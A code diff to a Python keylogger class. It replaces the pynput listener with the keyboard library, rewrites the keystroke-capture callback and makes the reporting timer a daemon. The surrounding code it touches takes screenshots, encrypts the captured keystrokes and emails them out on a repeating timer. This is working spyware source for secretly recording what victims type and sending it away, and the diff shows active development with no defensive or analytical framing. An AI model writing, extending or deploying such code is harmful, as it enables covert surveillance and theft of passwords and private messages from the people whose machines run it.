@@ -13,7 +13,7 @@ import pyscreenshot
 from email.mime.multipart import MIMEMultipart 
 from email.mime.text import MIMEText 
 from email.mime.image import MIMEImage
-import pynput.keyboard as Keyboard
+import keyboard as Keyboard
 from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import AES
@@ -106,50 +106,20 @@ class Keylogger():
         server.sendmail(self.email, self.email, msg.as_string())
         server.quit()
     
-    def log_keys(self, key):
-        try:
-            current_key = str(key.char)
-            self.append_to_log(current_key)
-        except AttributeError:
-            if key == key.esc:
-                current_key = "<ESC> "
-                self.append_to_log(current_key)
-            elif key == key.space:
-                current_key = "<SPACE> "
-                self.append_to_log(current_key)
-            elif key == key.shift_r:
-                current_key = "<RIGHT SHIFT> "
-                self.append_to_log(current_key)
-            elif key == key.shift_l:
-                current_key = "<LEFT SHIFT> "
-                self.append_to_log(current_key)
-            elif key == key.ctrl:
-                current_key = "<CONTROL> "
-                self.append_to_log(current_key)
-            elif key == key.backspace:
-                self.log = self.log[:-1]
-            elif key == key.alt:
-                current_key = "<ALT> "
-                self.append_to_log(current_key)
-            elif key == key.tab:
-                current_key = "<TAB> "
-                self.append_to_log(current_key)
-            elif key == key.caps_lock:
-                current_key = "<CAPS LOCK> "
-                self.append_to_log(current_key)
-            elif key == key.cmd:
-                current_key = "<FN/WIN> "
-                self.append_to_log(current_key)
-            elif key == key.delete:
-                current_key = "<DEL> "
-                self.append_to_log(current_key)
-            elif key == key.print_screen:
-                current_key = "<PRINT SCREEN> "
-                self.append_to_log(current_key)
+    def callback(self, event):
+        name = event.name
+        if len(name) > 1:
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
             else:
-                current_key = str(f" {key} ")
-                self.append_to_log(current_key)
-    
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        self.log += name
+
     def report(self):
         self.send_mail(Encryption().encrypt(self.log), self.screenshot()) #ENC
         class RepeatTimer(Timer):
@@ -157,17 +127,14 @@ class Keylogger():
                 while not self.finished.wait(self.interval):
                     self.function(*self.args, **self.kwargs)
         timer = RepeatTimer(self.interval, self.report)
+        timer.daemon = True
         timer.start()
 
     def run(self):
         self.sysinfo()
-        keyboard_listener = Keyboard.Listener(on_press=self.log_keys)
-        try:
-            keyboard_listener.start()
-            time.sleep(self.interval)
-            self.report()
-        except KeyboardInterrupt: 
-            self.send_mail(Encryption().encrypt(self.log), self.screenshot())
+        Keyboard.on_press(self.callback)
+        time.sleep(self.interval)
+        self.report()        
 
 
 class Encryption():
